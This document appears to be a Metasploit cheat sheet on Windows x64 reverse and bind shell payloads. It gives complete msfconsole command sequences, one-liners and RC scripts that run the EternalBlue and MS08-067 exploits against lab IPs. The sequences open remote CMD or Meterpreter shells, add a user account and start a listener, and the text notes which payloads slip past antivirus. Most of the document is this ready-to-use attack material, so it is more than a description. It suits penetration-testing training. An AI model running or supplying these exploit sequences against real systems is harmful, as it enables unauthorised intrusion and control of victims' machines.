## windows/x64/shell/reverse_tcp

**Metasploit Payload:** windows/x64/shell/reverse_tcp

windows/x64/shell/reverse_tcp is a classic Windows reverse TCP shell payload.

After exploitation, it attempts to create a connection from the victim to the attacker and returns a raw command shell (not Meterpreter).

### Key Characteristics

- Returns a basic Windows command shell (cmd.exe)
- Not a Meterpreter payload
- Lightweight and simple
- Often bypasses some antivirus engines
- Requires outbound connection from the target

### Required Settings

- You must set: LHOST, LPORT

### Usage with MS17-010 EternalBlue (Windows 7)

- Load the exploit module

```
use exploit/windows/smb/ms17_010_eternalblue

```

- Select the reverse shell payload

```
set PAYLOAD windows/x64/shell/reverse_tcp

```

- Set the target host

```
set RHOSTS 192.168.1.192

```

- Set the listener IP (attacker machine)

```
set LHOST 192.168.1.7

```

- Optional: Change the port (default = 4444)

```
set LPORT 443

```

- Check all required parameters

```
show options

```

- Run the exploit

```
exploit

```

### What You Get After Exploitation

- A raw Windows CMD shell
- You can run commands like:

```
whoami

```

```
ipconfig

```

```
net user

```

```
systeminfo

```

- No file upload/download functionality
- No privilege escalation modules built in
- No persistence
- It is simple but stable and works well on vulnerable Windows 7 systems.

### When to Use windows/x64/shell/reverse_tcp

- Choose this payload when:
    - Meterpreter is blocked by antivirus
    - You want a small, simple payload
    - You only need a quick interactive CMD shell
    - You are testing exploit reliability
    - The target has outbound network access

### Limitations

- No Meterpreter features
- No pivoting
- No screenshot, keylogging, or memory injection
- Limited functionality
- Requires outbound network access
- If the victim blocks outbound traffic, this payload will not work.

## windows/x64/shell_reverse_tcp

**Metasploit Payload:** windows/x64/shell_reverse_tcp

windows/x64/shell_reverse_tcp is a Windows 64-bit reverse TCP shell payload.

After exploitation, it creates a reverse connection from the victim to the attacker, giving you a direct CMD shell.

### Key Characteristics

- Provides a raw Windows command shell (cmd.exe)
- Not a Meterpreter payload
- Very lightweight and commonly used for stability
- Often avoids some AV due to smaller footprint
- Requires the victim to make an outbound connection

### Required Settings

- You must set: LHOST, LPORT

### Usage with MS17-010 EternalBlue

- Load the EternalBlue exploit

```
use exploit/windows/smb/ms17_010_eternalblue

```

- Select the reverse shell payload

```
set PAYLOAD windows/x64/shell_reverse_tcp

```

- Set the target host

```
set RHOSTS 192.168.1.192

```

- Set your local listener IP (attacker machine)

```
set LHOST 192.168.1.7

```

- Optional: Set a custom port (default = 4444)

```
set LPORT 443

```

- Check all parameters

```
show options

```

- Run the exploit

```
exploit

```

### What You Get After Exploitation

- You will receive a clean CMD shell, allowing commands like:

```
whoami

```

```
ipconfig

```

```
systeminfo

```

```
net user

```

```
dir

```

```
tasklist

```

### Limitations of this shell

- No file upload/download
- No in-memory modules
- No GUI interaction
- No scripting API
- No persistence
- Not upgradeable to Meterpreter automatically
- It is simple, stable, and works well on Windows 7 SP1 x64 targets especially when Meterpreter is blocked.

### When to Use windows/x64/shell_reverse_tcp

- Use this payload if:
    - Meterpreter is blocked by antivirus
    - You want a small, stealthy payload
    - You only need basic command execution
    - You want high reliability on EternalBlue
    - The victim allows outbound traffic

### Limitations

- No advanced post-exploitation features
- No screenshot/keylogging/priv-esc automation
- Cannot pivot other networks
- Needs outbound connectivity from the victim
- If outbound traffic is filtered, this payload will not connect back.

## windows/x64/shell/bind_tcp

**Metasploit Payload:** windows/x64/shell/bind_tcp

windows/x64/shell/bind_tcp is a Windows 64-bit bind shell payload.

Instead of connecting back, the victim opens a listener port, and the attacker connects to the victim's system directly.

Returns a raw CMD shell (not Meterpreter).

### Key Characteristics

- Provides a basic cmd.exe shell
- Does not require outbound connections from the victim
- Useful in highly filtered outbound environments

### Required Settings

- You must set: LPORT (the port the victim will listen on), RHOSTS (target IP)
- Note: Bind shells often fail if the victim has a firewall blocking inbound connections.

### Usage with MS17-010 EternalBlue (Windows SMB)

- Load the EternalBlue module

```
use exploit/windows/smb/ms17_010_eternalblue

```

- Set the bind shell payload

```
set PAYLOAD windows/x64/shell/bind_tcp

```

- Set the target system

```
set RHOSTS 192.168.1.192

```

- Set the port that the victim will listen on (Default is 4444. Example below uses 23.)

```
set LPORT 23

```

- Check all options

```
show options

```

- Run the exploit

```
exploit

```

### What Happens After Exploitation

- If successful, the victim system begins listening on the specified port: Victim: LISTEN on TCP/23
- Attacker: connects to the port
- You receive a direct, interactive Windows CMD shell, allowing commands such as:

```
whoami

```

```
ipconfig

```

```
net user

```

```
systeminfo

```

```
dir

```

### When to Use windows/x64/shell/bind_tcp

- Use this payload when:
    - The victim blocks outbound connections
    - You want a simple, raw command shell
    - The attacker can directly reach the victim's IP/port
    - The environment has no NAT, or you know the victim's public IP

### Limitations

- Fails if the victim's firewall blocks inbound ports
- No Meterpreter features
- No persistence
- Cannot pivot
- No file upload/download functionality
- Bind shells require open inbound access, so ensure no firewall is blocking the chosen port.

## windows/x64/shell_bind_tcp

**Metasploit Payload:** windows/x64/shell_bind_tcp

windows/x64/shell_bind_tcp is a 64-bit Windows bind shell payload.

After exploitation, the victim machine opens a listening port, and the attacker connects to it to obtain a raw CMD shell.

### Key Features

- Provides a basic Windows command shell (cmd.exe)
- Victim listens on a port (bind shell)
- Does not require outbound traffic from the target
- Useful when reverse shells fail

### Required Settings

- You must set: RHOSTS, LPORT (port on victim side)

### Usage with MS17-010 EternalBlue

- Load the exploit module:

```
use exploit/windows/smb/ms17_010_eternalblue

```

- Set the bind shell payload:

```
set PAYLOAD windows/x64/shell_bind_tcp

```

- Set the target system:

```
set RHOSTS 192.168.1.192

```

- Set the port the victim will listen on (example: 23):

```
set LPORT 23

```

- Show all required parameters:

```
show options

```

- Run the exploit:

```
exploit

```

### What You Get After Exploit

- A raw Windows CMD shell
- Run commands like:

```
whoami

```

```
ipconfig

```

```
dir

```

```
systeminfo

```

```
net user

```

### When to Use shell_bind_tcp

- Use this payload when:
    - Reverse shells are blocked by firewall
    - You need a minimal, stable, no-frills CMD shell
    - Target allows inbound connections on a specified port
    - AV blocks Meterpreter

### Limitations

- Fails if the victim firewall blocks inbound ports
- No Meterpreter features
- No upload/download capability
- No pivoting or post-exploitation modules
- Requires direct network access to the target

## Using msfconsole -x

**Metasploit:** Using msfconsole -x

msfconsole -x lets you run Metasploit commands automatically when msfconsole starts.

Useful for:

- Automation
- Scripting
- Quick testing
- Repeating exploit setups
- One-line exploit execution (lab-only)

### Basic Syntax

- msfconsole -x "<commands>"
- Commands inside quotes run immediately
- Multiple commands are separated using ;

### Example

- Basic example:

```
msfconsole -x "help; exit"

```

### Common Use Patterns

- Auto-load an exploit module

```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"

```

- Auto-load and configure RHOSTS

```
msfconsole -x "use <module>; set RHOSTS <target-ip>"

```

### EternalBlue Automation Examples

- Load EternalBlue only

```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"

```

- EternalBlue Reverse Shell (x64 shell)

```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/shell/reverse_tcp; set RHOSTS 192.168.1.192; set LHOST 192.168.1.7; set LPORT 443; exploit"

```

- EternalBlue Meterpreter Reverse TCP

```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set RHOSTS 192.168.1.192; set LHOST 192.168.1.7; set LPORT 443; exploit"

```

### Bind Shell Payload Automation

- EternalBlue Bind TCP Shell

```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/shell/bind_tcp; set RHOSTS 192.168.1.192; set LPORT 23; exploit"

```

- Add User Automation (documentation only)

```
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set PAYLOAD windows/adduser; set USER testuser; set PASS Test@123; set RHOSTS 192.168.1.247; exploit"

```

- Generic Reverse Shell

```
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set PAYLOAD generic/shell_reverse_tcp; set RHOSTS 192.168.1.247; set LHOST 192.168.1.7; exploit"

```

### Automated Auxiliary Scanners

- SMB scanner

```
msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"

```

- Port scanner

```
msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 445,139,80; run"

```

### Tips

- Auto-start msfconsole with silence

```
msfconsole -q -x "<commands>"

```

- Quiet mode (no banner)

### Template: Full Automation Script

- You can replace parameters to quickly build new automation lines:

```
msfconsole -x "use <module>; set PAYLOAD <payload>; set RHOSTS <ip>; set LHOST <listener-ip>; set LPORT <port>; exploit"

```

## Automation of msfconsole via RC Scripts

**Metasploit RC (Resource) scripts** allow you to automate commands, run exploits, start listeners, and pre-configure payloads without typing everything manually.

### Create an RC Script for MS17-010 EternalBlue

- Create the RC file

```
vim msf-auto-ms17-010_eternalblue.rc

```

- Insert the following content

```
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.1.192
set LHOST 192.168.1.7
set LPORT 443
exploit

```

- Run it with msfconsole

```
msfconsole -r msf-auto-ms17_010_eternalblue.rc

```

### Windows Listener (443)

- Create listener RC script

```
vim windows_listener_443.rc

```

- Add listener configuration

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.7
set LPORT 443
exploit

```

- Start the listener

```
msfconsole -r windows_listener_443.rc

```
